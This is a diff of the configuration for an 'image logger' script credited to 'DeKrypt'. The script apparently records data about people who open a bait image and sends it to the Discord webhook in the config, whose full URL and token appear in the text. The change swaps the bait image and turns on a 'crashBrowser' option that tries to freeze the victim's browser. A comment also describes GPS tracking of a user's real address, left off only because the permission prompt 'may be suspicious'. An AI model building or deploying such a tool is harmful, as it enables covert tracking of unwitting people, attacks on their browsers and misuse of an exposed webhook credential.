@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1442239245736611931/v_o1D1riHXYcUodajuQHph-PdkJe8zBBHxoCvt5ktH29BJ5KBer242aXDcPZANx2_tbd",
-    "image": "https://i.pinimg.com/736x/f4/25/29/f4252972fc26109c9e2fb85f9343cbd8.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/1200x/30/66/b1/3066b18fbb5757089bcfe86525c335b7.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -23,7 +23,7 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
